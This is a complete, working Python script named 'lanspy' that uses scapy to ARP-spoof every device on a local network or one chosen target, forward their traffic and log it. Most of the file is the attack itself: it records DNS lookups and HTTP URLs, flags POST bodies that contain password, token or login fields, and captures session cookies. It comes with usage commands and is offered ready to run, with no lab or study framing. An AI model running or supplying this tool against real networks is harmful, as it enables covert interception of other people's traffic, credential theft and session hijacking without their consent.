#!/usr/bin/env python3
"""
lanspy.py — ARP spoof + LAN sniffer
Poisons ARP caches on your own LAN, then logs:
  - DNS queries (every domain every device looks up)
  - HTTP requests (URLs, headers, plaintext creds)
  - Device activity summary

Usage:
  sudo python3 lanspy.py                   # auto-detect gateway, target all
  sudo python3 lanspy.py -t 192.168.1.5   # target one device
  sudo python3 lanspy.py --dns-only        # skip ARP spoof, just sniff DNS
"""

import sys
import os
import time
import signal
import argparse
import threading
import subprocess
from datetime import datetime
from collections import defaultdict

try:
    from scapy.all import (
        ARP, Ether, sendp, srp, sniff, DNS, DNSQR,
        IP, TCP, UDP, Raw, get_if_hwaddr, conf
    )
except ImportError:
    print("[!] scapy not installed. run: pip3 install scapy")
    sys.exit(1)

# ─── config ───────────────────────────────────────────────────────
LOG_FILE      = "lanspy.log"
ARP_INTERVAL  = 2      # seconds between ARP poison packets
SHOW_HTTP_BODY= False  # set True to dump HTTP body (verbose, noisy)
# ──────────────────────────────────────────────────────────────────

# ─── colors ───────────────────────────────────────────────────────
R  = "\033[91m"
G  = "\033[92m"
Y  = "\033[93m"
C  = "\033[96m"
W  = "\033[97m"
DIM= "\033[2m"
NC = "\033[0m"

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log(msg, color=W):
    line = f"{DIM}[{ts()}]{NC} {color}{msg}{NC}"
    print(line)
    with open(LOG_FILE, "a") as f:
        f.write(f"[{ts()}] {msg}\n")

# ─── network utils ────────────────────────────────────────────────
def get_mac(ip, iface):
    """ARP who-has to get MAC for an IP."""
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    result, _ = srp(pkt, iface=iface, timeout=2, verbose=False)
    for _, rcv in result:
        return rcv[Ether].src
    return None

def get_gateway(iface):
    """Read default gateway from routing table."""
    try:
        out = subprocess.check_output(
            ["route", "-n", "get", "default"],
            stderr=subprocess.DEVNULL
        ).decode()
        for line in out.splitlines():
            if "gateway:" in line:
                return line.split(":")[-1].strip()
    except Exception:
        pass
    # linux fallback
    try:
        out = subprocess.check_output(
            ["ip", "route", "show", "default"],
            stderr=subprocess.DEVNULL
        ).decode()
        return out.split()[2]
    except Exception:
        return None

def get_local_ip(iface):
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return None
    finally:
        s.close()

def scan_lan(gateway_ip, iface):
    """Ping sweep the /24 to find all live hosts."""
    subnet = ".".join(gateway_ip.split(".")[:3]) + ".0/24"
    log(f"scanning {subnet} for live hosts...", C)
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
    result, _ = srp(pkt, iface=iface, timeout=3, verbose=False)
    hosts = {}
    for _, rcv in result:
        ip  = rcv[ARP].psrc
        mac = rcv[Ether].src
        hosts[ip] = mac
    return hosts

# ─── ip forwarding ────────────────────────────────────────────────
def enable_ip_forward():
    if sys.platform == "darwin":
        os.system("sysctl -w net.inet.ip.forwarding=1 >/dev/null 2>&1")
    else:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")

def disable_ip_forward():
    if sys.platform == "darwin":
        os.system("sysctl -w net.inet.ip.forwarding=0 >/dev/null 2>&1")
    else:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")

# ─── arp poison ───────────────────────────────────────────────────
poisoning = True

def poison_pair(target_ip, target_mac, gateway_ip, gateway_mac, iface):
    """
    Tell target: 'I am the gateway'
    Tell gateway: 'I am the target'
    """
    my_mac = get_if_hwaddr(iface)

    # poison target
    sendp(
        Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                     psrc=gateway_ip, hwsrc=my_mac),
        iface=iface, verbose=False
    )
    # poison gateway
    sendp(
        Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                                      psrc=target_ip, hwsrc=my_mac),
        iface=iface, verbose=False
    )

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface):
    """Send correct ARP replies to un-poison both sides."""
    sendp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2,
            pdst=target_ip, hwdst=target_mac,
            psrc=gateway_ip, hwsrc=gateway_mac),
        iface=iface, count=5, verbose=False
    )
    sendp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2,
            pdst=gateway_ip, hwdst=gateway_mac,
            psrc=target_ip, hwsrc=target_mac),
        iface=iface, count=5, verbose=False
    )

def poison_loop(targets, gateway_ip, gateway_mac, iface):
    """Background thread: re-poison every ARP_INTERVAL seconds."""
    global poisoning
    while poisoning:
        for ip, mac in targets.items():
            if mac:
                poison_pair(ip, mac, gateway_ip, gateway_mac, iface)
        time.sleep(ARP_INTERVAL)

# ─── packet analysis ──────────────────────────────────────────────
seen_dns   = set()
http_stats = defaultdict(int)
activity   = defaultdict(list)

def handle_packet(pkt):
    src_ip = pkt[IP].src if pkt.haslayer(IP) else "?"

    # ── DNS ────────────────────────────────────────────────────────
    if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode("utf-8", errors="replace").rstrip(".")
        if qname and qname not in seen_dns:
            seen_dns.add(qname)
            log(f"DNS  {src_ip:<16} → {qname}", C)
            activity[src_ip].append(f"dns:{qname}")

    # ── HTTP ───────────────────────────────────────────────────────
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = pkt[Raw].load
        try:
            text = payload.decode("utf-8", errors="replace")
        except Exception:
            return

        dst_ip   = pkt[IP].dst  if pkt.haslayer(IP)  else "?"
        dst_port = pkt[TCP].dport

        # HTTP request
        if text.startswith(("GET ", "POST ", "PUT ", "DELETE ", "HEAD ", "PATCH ")):
            lines  = text.split("\r\n")
            method = lines[0].split(" ")[0]
            path   = lines[0].split(" ")[1] if len(lines[0].split(" ")) > 1 else "/"
            host   = ""
            for line in lines[1:]:
                if line.lower().startswith("host:"):
                    host = line.split(":", 1)[1].strip()
                    break
            url = f"http://{host}{path}"
            http_stats[host] += 1
            log(f"HTTP {src_ip:<16} {method:<6} {url}", G)
            activity[src_ip].append(f"http:{url}")

            # credential hunting — look for password fields in POST body
            if method == "POST" and len(lines) > 1:
                body = lines[-1] if lines else ""
                keywords = ["pass", "pwd", "password", "secret", "token", "auth", "login", "user", "email"]
                if any(k in body.lower() for k in keywords):
                    log(f"CRED {src_ip:<16} POST body → {body[:200]}", R)

        # HTTP response with Set-Cookie (session tokens)
        if "Set-Cookie:" in text or "set-cookie:" in text:
            for line in text.split("\r\n"):
                if line.lower().startswith("set-cookie:"):
                    cookie = line.split(":", 1)[1].strip()[:120]
                    log(f"COOK {src_ip:<16} → {cookie}", Y)

# ─── live summary ─────────────────────────────────────────────────
def print_summary():
    print(f"\n{W}{'━'*60}{NC}")
    print(f"{W}  LAN ACTIVITY SUMMARY{NC}")
    print(f"{W}{'━'*60}{NC}")
    print(f"  {C}DNS queries seen:{NC} {len(seen_dns)}")
    if http_stats:
        print(f"\n  {G}Top HTTP hosts:{NC}")
        for host, count in sorted(http_stats.items(), key=lambda x: -x[1])[:10]:
            print(f"    {count:>4}x  {host}")
    if activity:
        print(f"\n  {Y}Active devices:{NC}")
        for ip, acts in sorted(activity.items()):
            print(f"    {ip:<16} {len(acts)} events")
    print(f"{W}{'━'*60}{NC}")
    print(f"  Full log saved to: {LOG_FILE}")
    print(f"{W}{'━'*60}{NC}\n")

# ─── main ─────────────────────────────────────────────────────────
def main():
    global poisoning

    if os.geteuid() != 0:
        print("[!] run with sudo: sudo python3 lanspy.py")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="lanspy — ARP spoof + LAN sniffer")
    parser.add_argument("-t", "--target",   help="target IP (default: all hosts)")
    parser.add_argument("-i", "--iface",    help="network interface (default: auto)")
    parser.add_argument("--dns-only",       action="store_true", help="sniff only, no ARP spoof")
    parser.add_argument("--gateway",        help="gateway IP (default: auto-detect)")
    args = parser.parse_args()

    # ── interface ──────────────────────────────────────────────────
    iface = args.iface or conf.iface
    print(f"\n{W}  lanspy  |  interface: {iface}{NC}\n")

    # ── gateway ────────────────────────────────────────────────────
    gateway_ip = args.gateway or get_gateway(iface)
    if not gateway_ip:
        print("[!] couldn't auto-detect gateway. pass --gateway x.x.x.x")
        sys.exit(1)

    log(f"gateway: {gateway_ip}", W)
    gateway_mac = get_mac(gateway_ip, iface)
    if not gateway_mac:
        print(f"[!] couldn't get MAC for gateway {gateway_ip}")
        sys.exit(1)
    log(f"gateway MAC: {gateway_mac}", W)

    # ── targets ────────────────────────────────────────────────────
    if args.dns_only:
        log("DNS-only mode — no ARP spoofing", Y)
        targets = {}
    elif args.target:
        mac = get_mac(args.target, iface)
        if not mac:
            print(f"[!] couldn't get MAC for {args.target}. is it online?")
            sys.exit(1)
        targets = {args.target: mac}
        log(f"target: {args.target} ({mac})", Y)
    else:
        log("scanning for all LAN hosts...", C)
        targets = scan_lan(gateway_ip, iface)
        local_ip = get_local_ip(iface)
        targets.pop(gateway_ip, None)
        targets.pop(local_ip, None)
        for ip, mac in targets.items():
            log(f"  found: {ip:<16} {mac}", DIM)
        log(f"targeting {len(targets)} hosts", Y)

    if not targets and not args.dns_only:
        log("no targets found on LAN", R)
        sys.exit(1)

    # ── enable ip forwarding ───────────────────────────────────────
    if not args.dns_only:
        enable_ip_forward()
        log("IP forwarding: enabled", G)

    # ── signal handler ─────────────────────────────────────────────
    def shutdown(sig, frame):
        global poisoning
        poisoning = False
        print(f"\n{Y}[!] shutting down...{NC}")

        if not args.dns_only:
            log("restoring ARP tables...", Y)
            for ip, mac in targets.items():
                if mac:
                    restore_arp(ip, mac, gateway_ip, gateway_mac, iface)
            disable_ip_forward()
            log("ARP tables restored, IP forwarding disabled", G)

        print_summary()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)

    # ── start poison thread ────────────────────────────────────────
    if not args.dns_only:
        pt = threading.Thread(target=poison_loop,
                              args=(targets, gateway_ip, gateway_mac, iface),
                              daemon=True)
        pt.start()
        log("ARP poisoning started — ctrl+c to stop and restore", G)

    # ── sniff ──────────────────────────────────────────────────────
    bpf = "ip"
    log(f"sniffing on {iface}... (ctrl+c to stop)\n", G)

    print(f"  {C}DNS queries{NC}  = domains every device looks up")
    print(f"  {G}HTTP reqs{NC}   = plaintext web traffic (URLs, forms)")
    print(f"  {R}CRED hits{NC}   = POST data containing password-like fields")
    print(f"  {Y}COOKIES{NC}     = session tokens from HTTP responses\n")

    sniff(iface=iface, prn=handle_packet, filter=bpf, store=False)


if __name__ == "__main__":
    main()
